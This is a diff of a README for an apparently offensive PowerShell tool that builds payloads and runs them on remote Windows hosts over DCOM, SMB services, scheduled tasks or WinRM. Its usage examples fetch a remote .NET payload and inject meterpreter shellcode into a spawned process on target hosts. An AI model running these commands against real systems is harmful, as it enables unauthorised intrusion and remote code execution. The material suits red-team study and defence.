@@ -15,17 +15,16 @@ Invoke-PowerExec                -   runs PowerShell script block on remote compu
 
 The payload type must be specified within the function `New-PowerLoader`:
 
-| Type      | Description                               |
-| --------- | ----------------------------------------- |
-| PoSh      | PowerShell script                         |
-| NetAsm    | .NET assembly executable                  |
-| PE        | Windows PE file (EXE/DLL)                 |
-| Shellcode | Shellcode in binary format (experimental) |
+| Type      | Description                |
+| --------- | -------------------------- |
+| PoSh      | PowerShell script          |
+| NetAsm    | .NET assembly executable   |
+| PE        | Windows PE file (EXE/DLL)  |
+| Shellcode | Shellcode in binary format |
 
 Resulting PowerShell script block is built either from a local payload file or from a remote payload using a download cradle.
 
-Please note that PE execution output will only be retrieved when run locally, not remotely.
-Also, shellcode execution output can't be retrieved since it is injected in a detached process.
+Please note that PE and shellcode execution output will only be retrieved when run locally, not remotely.
 
 
 ## Bypass techniques
@@ -54,7 +53,7 @@ The execution method must be specified within the function `Invoke-PowerExec`:
 | SmbDcom         | Create DCOM instance via DCE/RPC                       | SMB named pipe               | Current user |
 | SmbService      | Create temporary service via DCE/RPC                   | SMB named pipe               | SYSTEM       |
 | SmbTask         | Create temporary scheduled task via DCE/RPC            | SMB named pipe               | SYSTEM       |
-| WinRM           | Run powershell via PowerShell Remoting                 | Windows Remote Management    | Current user |
+| WinRM           | Run powershell via Windows Remote Management           | PowerShell Remoting          | Current user |
 
 Depending on the method used, a covert channel is established in order to deliver the payload and to retrieve execution output.
 
@@ -84,10 +83,10 @@ PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Fla
 PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -Authentication Default -ComputerList 192.168.1.1,192.168.1.2
 ```
 
-Run a raw shellcode on a remote host through a temporary service:
+Run a raw shellcode by creating a new process on a remote host through a temporary service:
 
 ```
-PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -Method SmbService -ComputerList 192.168.1.1
+PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin -SpawnProcess notepad.exe | Invoke-PowerExec -Method SmbService -ComputerList 192.168.1.1
 ```
 
 
